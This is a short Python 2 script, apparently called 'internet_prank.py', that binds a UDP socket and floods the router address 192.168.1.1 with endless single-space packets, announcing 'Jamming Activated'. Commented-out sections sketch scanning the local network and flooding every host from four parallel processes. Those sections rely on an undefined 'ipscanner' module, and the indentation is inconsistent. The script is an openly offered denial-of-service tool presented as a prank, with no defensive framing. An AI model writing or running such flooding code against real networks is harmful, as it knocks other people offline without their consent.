import os, sys, socket
import multiprocessing as mp

def colored(color, text):
        r, g, b = color
        return "\033[38;2;{};{};{}m{}\033[38;2;255;255;255m".format(r, g, b, text)

def clear():
        print("\033[2J")
        print("\033[0;0H")

def close():
	UDPSock.close()
	sys.exit()

host = ""
port = 80
buf = 1024
UDPSock = None

def setup_socket(addr):
	global UDPSock
	UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		UDPSock.bind(addr)
	except Exception as e:
        	print e
		print "Looks like there was a problem. Try doing the following to fix your problem: \nIf you did not run the program with 'sudo', run 'sudo python internet_prank.py'. \nIf this does not work, then contact the creator of this program."
		close()

setup_socket((host, port))


def update_ips():
	global ip_list
	ip_list = ipscanner.map_network()

def repeated_update_ips():
	while True:
		update_ips()

def send_message(message):
#	for ip in ip_list:
#		UDPSock.sendto(message, (ip, port))
	UDPSock.sendto(message, ("192.168.1.1", port))

def repeat_send():
	while True:
		send_message(" ")

def sub_main():
#	print "Initializing"
#	update_ips()
	print "Jamming Activated"
	print "Use ctrl-c to stop"
#	p1 = mp.Process(target=repeat_send)
#        p2 = mp.Process(target=repeat_send)
#        p3 = mp.Process(target=repeat_send)
#        p4 = mp.Process(target=repeat_send)
#	p1.start()
#	p2.start()
#	p3.start()
#	p4.start()
#	x = raw_input("Hit enter to exit")
#	p1.terminate()
#	p2.terminate()
#	p3.terminate()
#	p4.terminate()
#	p1.join()
#	p2.join()
#	p3.join()
#	p4.join()
	repeat_send()

def main():
	try:
		sub_main()
	except Exception as e:
		print (e)
	finally:
		print "Closing ports..."
		close()
main()
